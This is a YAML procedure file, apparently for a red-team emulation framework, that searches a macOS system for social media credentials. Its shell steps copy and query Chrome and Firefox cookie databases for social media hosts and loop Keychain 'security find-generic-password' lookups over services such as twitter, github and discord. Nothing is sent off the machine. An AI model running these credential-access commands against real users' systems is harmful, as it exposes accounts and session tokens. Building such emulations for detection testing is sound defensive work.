---
api_version: 2.0
uuid: 56e5c2a9-8d1f-7a72-3e6f-5b0c3d3a7f9e
name: Social Media Account Compromise
authors:
- Claude Code
description: |
  Search for social media tokens and credentials stored on a macOS system. Extracts
  cookies from browser data directories, searches for social media session tokens,
  and queries the macOS Keychain for stored social media credentials.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1078 Valid Accounts
requirements:
  platforms:
  - os: darwin
args:
- name: browser
  description: Primary browser to target for cookie and token extraction
  type: string
  default: chrome
steps:
- name: search_browser_social_media_data
  description: Search browser data directories for social media cookies and tokens
  inline: |
    echo "=== Searching Browser Data for Social Media Tokens ==="
    echo "--- Cookie databases ---"
    find "$HOME/Library/Application Support" -name "Cookies" -o -name "Cookies.binarycookies" -o -name "cookies.sqlite" 2>/dev/null | while read -r f; do
      echo "Found: $f"
      ls -la "$f"
    done
    echo "--- Local Storage databases ---"
    find "$HOME/Library/Application Support" -name "*.sqlite" -path "*/Local Storage/*" 2>/dev/null | while read -r f; do
      echo "Found local storage: $f"
    done
    echo "--- Web Data databases ---"
    find "$HOME/Library/Application Support" -name "Web Data" 2>/dev/null | while read -r f; do
      echo "Found web data: $f"
    done
- name: extract_browser_cookies
  description: Extract social media cookies from Chrome, Safari, and Firefox
  inline: |
    echo "=== Extracting Social Media Cookies ==="
    # Chrome cookies
    chrome_cookies="$HOME/Library/Application Support/Google/Chrome/Default/Cookies"
    if [ -f "$chrome_cookies" ]; then
      echo "--- Chrome Cookies ---"
      cp "$chrome_cookies" /tmp/ttp_chrome_cookies.db 2>/dev/null
      sqlite3 /tmp/ttp_chrome_cookies.db "SELECT host_key, name, path FROM cookies WHERE host_key LIKE '%twitter%' OR host_key LIKE '%facebook%' OR host_key LIKE '%instagram%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%github%' OR host_key LIKE '%x.com%' LIMIT 30;" 2>/dev/null || echo "Could not query Chrome cookies (may be locked)"
      rm -f /tmp/ttp_chrome_cookies.db
    else
      echo "Chrome cookies database not found"
    fi
    # Firefox cookies
    ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
    if [ -d "$ff_profiles" ]; then
      echo "--- Firefox Cookies ---"
      find "$ff_profiles" -name "cookies.sqlite" 2>/dev/null | while read -r db; do
        cp "$db" /tmp/ttp_ff_cookies.db 2>/dev/null
        sqlite3 /tmp/ttp_ff_cookies.db "SELECT host, name, path FROM moz_cookies WHERE host LIKE '%twitter%' OR host LIKE '%facebook%' OR host LIKE '%instagram%' OR host LIKE '%linkedin%' OR host LIKE '%github%' OR host LIKE '%x.com%' LIMIT 30;" 2>/dev/null || echo "Could not query Firefox cookies"
        rm -f /tmp/ttp_ff_cookies.db
      done
    else
      echo "Firefox profiles not found"
    fi
    # Safari cookies
    safari_cookies="$HOME/Library/Cookies/Cookies.binarycookies"
    if [ -f "$safari_cookies" ]; then
      echo "--- Safari Cookie File Found ---"
      ls -la "$safari_cookies"
      echo "(Safari uses binary cookie format - file located for analysis)"
    else
      echo "Safari cookies file not found"
    fi
- name: search_keychain_social_media
  description: Search macOS Keychain for stored social media credentials
  inline: |
    echo "=== Searching Keychain for Social Media Entries ==="
    services=("twitter" "facebook" "instagram" "linkedin" "github" "x.com" "meta" "tiktok" "reddit" "discord" "slack")
    for svc in "${services[@]}"; do
      echo "--- Searching for '$svc' ---"
      security find-generic-password -s "$svc" 2>&1 | grep -v "could not be found" || true
      security find-internet-password -s "$svc" 2>&1 | grep -v "could not be found" || true
    done
    echo "--- Searching for OAuth tokens in keychain ---"
    security find-generic-password -s "com.google.Chrome" 2>&1 | grep -v "could not be found" || true
    security find-generic-password -s "com.apple.Safari" 2>&1 | grep -v "could not be found" || true
  cleanup:
    inline: |
      echo "Removing temporary cookie databases"
      rm -f /tmp/ttp_chrome_cookies.db /tmp/ttp_ff_cookies.db
tests:
- name: dry_run_test
  dry_run: true
